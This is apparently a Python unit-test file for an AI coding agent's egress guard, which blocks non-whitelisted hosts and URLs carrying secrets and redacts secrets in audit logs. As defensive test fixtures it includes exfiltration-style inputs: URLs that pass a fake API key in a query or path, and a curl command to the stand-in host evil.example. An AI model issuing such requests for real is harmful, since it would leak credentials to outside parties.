from __future__ import annotations

import asyncio
import json
import tempfile
import unittest
from pathlib import Path

from lion_code.core.cancellation import CancellationToken
from lion_code.permission_state import PermissionController, PermissionState
from lion_code.runtime.session_identity import SessionIdentityState
from lion_code.tooling.audit import ExecutionAuditLog
from lion_code.tooling.context import ToolContext
from lion_code.tooling.egress_guard import (
    EgressGuardMiddleware,
    EgressWhitelist,
    extract_urls,
)
from lion_code.tooling.middleware import AuditMiddleware
from lion_code.tooling.registry import ToolRegistry
from lion_code.tooling.runtime import ToolRuntime
from lion_code.tooling.secret_provider import SecretStore
from lion_code.tooling.types import LionTool, ToolCapabilities, ToolResult

SECRET = "sk-live-abcdef123456"
ALLOWED = "docs.example.org"


def _web_fetch_tool() -> LionTool:
    async def execute(_context, _tool_call_id, _arguments, _on_update):
        return ToolResult(content="<html>fetched</html>")

    return LionTool(
        name="web_fetch",
        description="web_fetch",
        parameters={"type": "object", "properties": {}},
        execute_fn=execute,
        capabilities=ToolCapabilities(read_only=True),
    )


def _shell_tool() -> LionTool:
    async def execute(_context, _tool_call_id, _arguments, _on_update):
        return ToolResult(content="done")

    return LionTool(
        name="run_shell",
        description="run_shell",
        parameters={"type": "object", "properties": {}},
        execute_fn=execute,
        capabilities=ToolCapabilities(executes_process=True),
    )


def _runtime(
    tool: LionTool,
    whitelist: EgressWhitelist,
    *,
    store: SecretStore | None = None,
    audit_log: ExecutionAuditLog | None = None,
) -> ToolRuntime:
    registry = ToolRegistry()
    registry.register(tool)
    middleware: list = [EgressGuardMiddleware(whitelist, store)]
    if audit_log is not None:
        middleware.append(AuditMiddleware())
    context = ToolContext(
        session=SessionIdentityState("session", "2026-08-22T00:00:00Z"),
        cancellation=CancellationToken(),
        cwd=Path.cwd(),
        registry=registry,
        permission=PermissionController(PermissionState("bypassPermissions")),
        read_file_state={},
        audit_log=audit_log,
    )
    return ToolRuntime(registry, context, middleware)


def _run(
    tool: LionTool,
    whitelist: EgressWhitelist,
    arguments: dict,
    *,
    store: SecretStore | None = None,
    audit_log: ExecutionAuditLog | None = None,
) -> ToolResult:
    runtime = _runtime(tool, whitelist, store=store, audit_log=audit_log)
    return asyncio.run(
        runtime.execute(tool_call_id="call-1", name=tool.name, arguments=arguments)
    )


class TestEgressWhitelist(unittest.TestCase):
    def test_settings_and_provider_hosts_merge(self) -> None:
        with (
            tempfile.TemporaryDirectory() as home,
            tempfile.TemporaryDirectory() as cwd,
        ):
            settings = Path(cwd) / ".claude" / "settings.json"
            settings.parent.mkdir()
            settings.write_text(
                json.dumps({"egress": {"allow_hosts": ["Example.COM", ""]}}),
                encoding="utf-8",
            )
            whitelist = EgressWhitelist.from_sources(
                home=Path(home),
                cwd=Path(cwd),
                provider_hosts=frozenset({"api.anthropic.com"}),
            )
        self.assertTrue(whitelist.allows("example.com"))
        self.assertTrue(whitelist.allows("api.anthropic.com"))
        self.assertFalse(whitelist.allows("evil.example"))

    def test_empty_sources_deny_everything(self) -> None:
        with (
            tempfile.TemporaryDirectory() as home,
            tempfile.TemporaryDirectory() as cwd,
        ):
            whitelist = EgressWhitelist.from_sources(home=Path(home), cwd=Path(cwd))
        self.assertFalse(whitelist.allows("api.anthropic.com"))

    def test_extract_urls(self) -> None:
        urls = extract_urls("curl https://a.io/x?y=1 && wget http://b.cn")
        self.assertEqual(urls, ["https://a.io/x?y=1", "http://b.cn"])


class TestLevelA(unittest.TestCase):
    def test_non_whitelisted_destination_is_blocked_and_audited(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            audit_log = ExecutionAuditLog(Path(directory) / "execution.audit")
            result = _run(
                _web_fetch_tool(),
                EgressWhitelist(frozenset({ALLOWED})),
                {"url": f"https://{ALLOWED}.evil/"},
                audit_log=audit_log,
            )
            row = json.loads(
                (Path(directory) / "execution.audit").read_text(encoding="utf-8")
            )
        self.assertTrue(result.is_error)
        self.assertIn("not whitelisted", result.content)
        self.assertEqual(row["result"], "blocked")
        self.assertEqual(row["destination"], f"{ALLOWED}.evil")

    def test_whitelisted_destination_passes(self) -> None:
        result = _run(
            _web_fetch_tool(),
            EgressWhitelist(frozenset({ALLOWED})),
            {"url": f"https://{ALLOWED}/docs"},
        )
        self.assertFalse(result.is_error)
        self.assertEqual(result.content, "<html>fetched</html>")

    def test_secret_in_query_is_blocked(self) -> None:
        store = SecretStore({"API_KEY": SECRET}, b"k")
        result = _run(
            _web_fetch_tool(),
            EgressWhitelist(frozenset({ALLOWED})),
            {"url": f"https://{ALLOWED}/callback?token={SECRET}"},
            store=store,
        )
        self.assertTrue(result.is_error)
        self.assertIn("secret fingerprint", result.content)
        self.assertTrue(result.details["fingerprint_hit"])

    def test_secret_in_path_is_blocked(self) -> None:
        store = SecretStore({"API_KEY": SECRET}, b"k")
        result = _run(
            _web_fetch_tool(),
            EgressWhitelist(frozenset({ALLOWED})),
            {"url": f"https://{ALLOWED}/verify/{SECRET}"},
            store=store,
        )
        self.assertTrue(result.is_error)

    def test_clean_whitelisted_url_with_store_passes(self) -> None:
        store = SecretStore({"API_KEY": SECRET}, b"k")
        result = _run(
            _web_fetch_tool(),
            EgressWhitelist(frozenset({ALLOWED})),
            {"url": f"https://{ALLOWED}/docs?topic=python"},
            store=store,
        )
        self.assertFalse(result.is_error)


class TestLevelB(unittest.TestCase):
    def test_shell_url_is_observed_not_blocked(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            audit_log = ExecutionAuditLog(Path(directory) / "execution.audit")
            result = _run(
                _shell_tool(),
                EgressWhitelist(frozenset({ALLOWED})),
                {"command": f"curl https://evil.example/x > out && echo {SECRET}"},
                audit_log=audit_log,
            )
            row = json.loads(
                (Path(directory) / "execution.audit").read_text(encoding="utf-8")
            )
        self.assertFalse(result.is_error)
        self.assertEqual(row["result"], "success")
        self.assertEqual(row["destination"], "evil.example")
        self.assertTrue(row["best_effort"])

    def test_shell_without_url_has_no_egress_details(self) -> None:
        result = _run(
            _shell_tool(),
            EgressWhitelist(frozenset({ALLOWED})),
            {"command": "ls -la"},
        )
        self.assertNotIn("egress_destination", result.details)

    def test_non_egress_tool_is_untouched(self) -> None:
        async def execute(_context, _tool_call_id, _arguments, _on_update):
            return ToolResult(content="file contents")

        read_tool = LionTool(
            name="read_file",
            description="read_file",
            parameters={"type": "object", "properties": {}},
            execute_fn=execute,
            capabilities=ToolCapabilities(read_only=True),
        )
        result = _run(
            read_tool,
            EgressWhitelist(frozenset()),
            {"file_path": "a.txt"},
        )
        self.assertFalse(result.is_error)
        self.assertEqual(result.content, "file contents")

    def test_provider_host_derivation_allows_fetch(self) -> None:
        with (
            tempfile.TemporaryDirectory() as home,
            tempfile.TemporaryDirectory() as cwd,
        ):
            whitelist = EgressWhitelist.from_sources(
                home=Path(home),
                cwd=Path(cwd),
                provider_hosts=frozenset({"api.anthropic.com"}),
            )
        result = _run(
            _web_fetch_tool(),
            whitelist,
            {"url": "https://api.anthropic.com/v1/docs"},
        )
        self.assertFalse(result.is_error)


class TestAuditRowRedaction(unittest.TestCase):
    """审计行本身不得成为明文 secret 聚集地。"""

    def test_fingerprint_block_audit_row_is_secret_free(self) -> None:
        store = SecretStore({"API_KEY": SECRET}, b"k")
        with tempfile.TemporaryDirectory() as directory:
            audit_log = ExecutionAuditLog(
                Path(directory) / "execution.audit", store=store
            )
            result = _run(
                _web_fetch_tool(),
                EgressWhitelist(frozenset({ALLOWED})),
                {"url": f"https://{ALLOWED}/callback?token={SECRET}"},
                store=store,
                audit_log=audit_log,
            )
            row_text = (Path(directory) / "execution.audit").read_text(encoding="utf-8")
        self.assertTrue(result.is_error)
        self.assertNotIn(SECRET, row_text)
        self.assertIn("***", row_text)

    def test_shell_command_secret_is_redacted_in_audit(self) -> None:
        store = SecretStore({"API_KEY": SECRET}, b"k")
        with tempfile.TemporaryDirectory() as directory:
            audit_log = ExecutionAuditLog(
                Path(directory) / "execution.audit", store=store
            )
            _run(
                _shell_tool(),
                EgressWhitelist(frozenset({ALLOWED})),
                {"command": f"deploy --token={SECRET}"},
                audit_log=audit_log,
            )
            row_text = (Path(directory) / "execution.audit").read_text(encoding="utf-8")
        self.assertNotIn(SECRET, row_text)


if __name__ == "__main__":
    unittest.main()
